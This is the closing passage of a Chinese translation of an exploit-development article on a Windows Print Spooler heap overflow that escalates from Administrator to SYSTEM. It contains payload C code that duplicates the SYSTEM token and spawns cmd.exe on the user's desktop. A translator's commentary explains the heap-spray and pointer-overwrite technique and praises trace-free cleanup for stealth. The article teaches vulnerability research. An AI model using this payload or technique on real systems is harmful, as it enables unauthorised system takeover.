            WCHAR name[128]={0}, dom[128]={0}; DWORD nl=128, dl=128; SID_NAME_USE use;
            if (LookupAccountSidW(NULL, ((TOKEN_USER*)tu)->User.Sid, name,&nl, dom,&dl, &use))
                pos += sprintf_s(buf+pos, sizeof(buf)-pos, "Token User: %S\\%S\r\n", dom, name);
            LPWSTR sid=NULL;
            if (ConvertSidToStringSidW(((TOKEN_USER*)tu)->User.Sid, &sid)) {
                pos += sprintf_s(buf+pos, sizeof(buf)-pos, "Token SID:  %S\r\n", sid); LocalFree(sid);
            }
        }
        /* ... enumerate TokenPrivileges and TokenIntegrityLevel similarly ... */
        CloseHandle(hToken);
    }

    /* spawn cmd.exe (Session 0 for this variant) */
    STARTUPINFOW si = { .cb = sizeof si }; PROCESS_INFORMATION pi = {0};
    WCHAR sysDir[MAX_PATH], cmd[MAX_PATH]; GetSystemDirectoryW(sysDir, MAX_PATH);
    swprintf_s(cmd, MAX_PATH, L"%s\\cmd.exe", sysDir);
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    hFile = CreateFileA("C:\\Windows\\Temp\\EXPLOITED.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                        0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) { WriteFile(hFile, buf, pos, &written, NULL);
        CloseHandle(hFile); }
}
```

第二个 payload 与第一个几乎一致，只是它把新进程搬出 Session 0、送到交互桌面，让我们得到一个看得见、敲得动的 shell。确切地说有两处不同：一个小辅助过程 pick_interactive_session，以及 shellcode_func 例程的一段收尾：

```objectivec
/* duplicate our SYSTEM token, retarget it to the interactive session, and launch
   cmd.exe on that desktop. buf/pos are the SAME proof buffer the token dump above
   already filled, so these lines land in EXPLOITED.txt too. */

HANDLE hSysToken = NULL, hNewToken = NULL; BOOL shellOk = FALSE;
STARTUPINFOW si = { .cb = sizeof si, .lpDesktop = L"WinSta0\\Default" };
PROCESS_INFORMATION pi = {0};
WCHAR sysDir[MAX_PATH], cmd[MAX_PATH]; GetSystemDirectoryW(sysDir, MAX_PATH);
swprintf_s(cmd, MAX_PATH, L"%s\\cmd.exe", sysDir);
pos += sprintf_s(buf+pos, sizeof(buf)-pos, "\r\n[*] Spawning SYSTEM shell in user session...\r\n");

if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hSysToken)) {
    if (DuplicateTokenEx(hSysToken, TOKEN_ALL_ACCESS, NULL,
                         SecurityImpersonation, TokenPrimary, &hNewToken)) {
        DWORD sessionId = pick_interactive_session();         // the ACTIVE user session
        pos += sprintf_s(buf+pos, sizeof(buf)-pos, "[*] Target session: %lu\r\n", sessionId);
        SetTokenInformation(hNewToken, TokenSessionId, &sessionId, sizeof(DWORD));
        shellOk = CreateProcessAsUserW(hNewToken, NULL, cmd, NULL, NULL, FALSE,
                                       CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    }
}

if (shellOk) {
    pos += sprintf_s(buf+pos, sizeof(buf)-pos, "[+] SYSTEM shell created! PID: %lu\r\n",
                     pi.dwProcessId);
    BYTE stu[256]; DWORD srl = 0; LPWSTR ssid = NULL;        // confirm the spawned shell's SID
    if (GetTokenInformation(hNewToken, TokenUser, stu, sizeof(stu), &srl) &&
        ConvertSidToStringSidW(((TOKEN_USER *)stu)->User.Sid, &ssid)) {
        pos += sprintf_s(buf+pos, sizeof(buf)-pos, "[+] Shell token SID: %S\r\n", ssid); LocalFree(ssid);
    }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
}
```

spoolsv.exe 运行在 Session 0，那里没有可见桌面，在里面简单调一个 CreateProcess 完全看不见。所以必须把 SYSTEM token 复制成一个新的主 token，用 pick_interactive_session 例程选出交互会话，把复制 token 的 TokenSessionId 设为该会话，再以 WinSta0\\Default 为目标调 CreateProcessAsUserW 函数。

不出所料，必须选活动会话而不是物理控制台——我这里用的是 Hyper-V 增强会话里的虚拟机。选了活动会话之后，cmd.exe 就出现在真实桌面上。最后跑一下 whoami 命令，看到的就是 NT AUTHORITY\\SYSTEM。

## 11\. 参考资料

读者可以通过以下来源进一步了解本文提到的主题：

-   MS-RPRN, Print System Remote Protocol（Microsoft Open Specifications）：https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/
    
-   EnumForms / AddForm / FORM_INFO_1 / FORM_INFO_2（Microsoft Learn, Printing）：https://learn.microsoft.com/en-us/windows/win32/printdocs/enumforms
    
-   Windows Internals, 7th edition（Parts 1 & 2），Yosifovich、Ionescu、Russinovich、Solomon 与 Allievi 著——RPC、服务与 Segment Heap：https://www.microsoftpressstore.com/store/windows-internals-part-1-system-architecture-processes-9780735684188 与 https://www.microsoftpressstore.com/store/windows-internals-part-2-9780135462409
    
-   The Windows Segment Heap 与 VS allocator——Windows 10+ 用户态堆内部机制：参见 Windows Internals 中关于 \_SEGMENT_HEAP、\_HEAP_VS_CONTEXT 和 \_HEAP_VS_CHUNK_HEADER 的章节。
    
-   Saar Amar 的 segment-heap 研究文章：https://saaramar.github.io/Publications/
    
-   CVE-2021-34527（PrintNightmare）：MS-RPRN 攻击面的经典案例：https://www.microsoft.com/en-us/msrc/blog/2021/07/clarified-guidance-for-cve-2021-34527-windows-print-spooler-vulnerability
    
-   CVE-2021-1675：Windows Print Spooler 提权/远程代码执行（PrintNightmare 的 LPE 一半），CVE-2021-34527 的姊妹篇：https://github.com/cube0x0/CVE-2021-1675
    
-   OpenPrinter、ClosePrinter、DeleteForm（Microsoft Learn, Printing），EnumForms 与 AddForm 这对函数的同伴：https://learn.microsoft.com/en-us/windows/win32/printdocs/openprinter
    
-   \[MS-RPCE\] Remote Procedure Call Protocol Extensions——NDR / NDR64，以及 conformant array 上界与 RPC_X_BAD_STUB_DATA 背后的 stub 数据一致性检查：https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/fb1ee8ad-3d98-4a17-a4d6-3d1693626410
    
-   Mark Vincent Yason, “Windows 10 Segment Heap Internals,” Black Hat USA 2016——Segment Heap 及其 VS（variable-size）分配器的权威参考（groom 所用）：https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf
    
-   Privilege Constants（SeDebugPrivilege、SeImpersonatePrivilege 等），Microsoft Learn：https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
    
-   MITRE ATT&CK T1134.001, Access Token Manipulation: Token Impersonation/Theft——payload 的 DuplicateTokenEx + CreateProcessAsUserW 技术：https://attack.mitre.org/techniques/T1134/001/
    
-   MITRE ATT&CK T1055.001, Process Injection: Dynamic-link Library Injection——注入器的 VirtualAllocEx + WriteProcessMemory + CreateRemoteThread(LoadLibraryW) 序列：https://attack.mitre.org/techniques/T1055/001/
    
-   Debugging Tools for Windows（WinDbg / cdb），Microsoft Learn——用于崩溃栈与 RVA 断点捕获：https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/
    
-   Winbindex：https://winbindex.m417z.com/
    
-   CWE-122: Heap-based Buffer Overflow：https://cwe.mitre.org/data/definitions/122.html
    
-   CWE-787: Out-of-bounds Write：https://cwe.mitre.org/data/definitions/787.html
    
-   CWE-20: Improper Input Validation：https://cwe.mitre.org/data/definitions/20.html
    
-   CVSS v3.1 Specification Document（FIRST）：https://www.first.org/cvss/v3.1/specification-document
    
-   Exploiting Reversing（ER）系列第 06–09 篇（Alexandre Borges 著）：https://www.blackstormsecurity.com/research/ 与 https://exploitreversing.com/
    

## 12\. 结语

本文从讨论内核 minifilter 漏洞和八个 exploit 的 ERS_06–ERS_08，转到用户态的 SYSTEM 服务，但沿用了同样的纪律来组织各节的讨论与推导。当然，这次漏洞没有影响 Canary 版 Windows 上的整个系统或服务本身，但在满足前提条件的情况下，它允许我们从 Administrator 账户提升到 SYSTEM。一方面这个漏洞相当简单；另一方面，它为读者提供了面向未来利用场景的现成思路和指引。虽然之前没明说，但有一条教训值得所有做安全研究的人记住：别把 DoS 当成最终答案，也别把它当成写 primitive 能换来的最小成果。第二条教训在前几篇里已经强调过——即便是一个受限的写 primitive，也可能正是攻陷一个系统所需要的一切。

想保持联系的话：

-   X：@ale_sp_brazil
    
-   Bluesky：@alexandreborges.bsky.social
    
-   研究文章：https://www.blackstormsecurity.com/research/
    
-   博客：https://exploitreversing.com/
    

Keep developing exploits，下一篇文章见！

——Alexandre Borges

## 译者解读

**这个 bug 的本质：信任了声明，没有验证现实。** EnumFormsW 的契约是“调用方声明 cbBuf，服务端按声明分配和使用”。整套二次调用协议（先问大小、再给缓冲）建立在这个契约可信的前提上。漏洞的全部逻辑就一句话：服务端用 `pForm + cbBuf` 推出字符串区起点，却从不检查这个起点是否落在调用方真实分配的内存里。客户端 winspool.drv 里有校验，但那只是“前门保安”——绕过前门（进程内直连 spoolss!EnumFormsW），后面整条 InternalEnumForms → CopyIniFormToFormInfo → PackStrings → memcpy 链上没有任何一处重新验证。这是典型的“校验只在信任边界做一次、内部组件之间不再复核”的结构，RPC 接口、IPC handler、内核 ioctl 里都常见同类问题。

**为什么 RPC 打不通、DLL 注入反而打得通。** 这大概是本文最容易被误读的一点，值得展开：NDR 编组在接口定义层面把 pForm 数组和 cbBuf 绑死了——线上传输的字节数就是 cbBuf 声明的数，你没法“声明 2GB、实际传 64KB”。这不是 bug，是 RPC 层的设计恰好堵住了这条远程路。作者也只测了一次 Windows Server 2025 的远程路径（NDR stub 拒绝了超大缓冲），自己都标注了“读者应再验证”。所以利用只能是进程内的：注入 DLL 进 spoolsv，直接拿 spoolss.dll 的导出函数调用——这时 pForm 和 cbBuf 是两个互不约束的栈参数，一个指向小缓冲，一个报大数字。这也决定了这个漏洞的天花板：Admin→SYSTEM，而不是普通用户→SYSTEM。MSRC 的拒收逻辑（需要管理员权限、无远程 PoC）在他们的评分体系里是自洽的；作者也认这个账，把它当作教学案例发布。

**16 字节 primitive 的含金量。** 利用没有走“砸烂 VS chunk 头”的路线——那会触发 Segment Heap 的异或编码校验，进程当场暴毙。它做的是算术题： `cbBuf = needed + (delta - custom_off)` ，让打包字符串的落点恰好跳过 16 字节的 \_HEAP_VS_CHUNK_HEADER，直接压在下一个 SPRAY_OBJ 的第一个字段上——一个我们 spray 出来的、值为 NULL 的函数指针。写的内容同样可控：AddFormW 植入的表单名就是将来被 memcpy 的字节。地址含 NULL 宽字符会截断字符串？那就先 VirtualAlloc 扫一个低位不含零字的可执行页，放一个 `mov rax, imm64; jmp rax` 的 trampoline。整套打法里每个环节都在解决一个具体约束，没有一步是玄学。

**两点提醒。** 其一，文中 Canary 版的 InternalEnumForms 已经出现了整数溢出保护、总量复核、字段类型范围检查等新代码（主流版没有），说明微软在逐步收紧这条路径；但现在没修，不代表以后不修，复现要趁早。其二，两个 exploit 变体都收了尾：删除植入表单、释放全部 spray 块、spoolsv 存活。这种“利用完不留痕”的工程习惯，比 exploit 本身更值得学——目标进程崩一次，隐蔽性就全没了。

好文推荐 · 目录
